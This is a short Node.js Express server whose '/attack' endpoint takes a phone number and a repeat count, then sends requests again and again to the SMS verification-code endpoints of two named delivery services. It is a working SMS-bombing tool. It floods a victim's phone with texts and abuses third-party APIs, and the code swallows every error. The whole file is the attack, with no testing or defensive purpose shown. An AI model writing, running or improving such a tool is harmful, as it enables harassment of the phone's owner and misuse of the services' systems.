const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const services = [
    {
        name: "Allo Pizza",
        url: "https://allopizza.su/api/v1/auth/otp",
        method: "POST",
        data: (phone) => ({ phone: phone })
    },
    {
        name: "M-Food",
        url: "https://spb.m-food.ru/local/components/mfood/auth/ajax.php",
        method: "POST",
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        data: (phone) => `action=send_code&phone=%2B${phone}`
    }
];

app.post('/attack', async (req, res) => {
    const { phone, repeats } = req.body;

    for (let i = 0; i < repeats; i++) {
        services.forEach(async (s) => {
            try {
                await axios({
                    method: s.method,
                    url: s.url,
                    data: typeof s.data === 'function' ? s.data(phone) : s.data,
                    headers: s.headers || {}
                });
            } catch (e) {}
        });
        await new Promise(r => setTimeout(r, 2000));
    }
    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT);
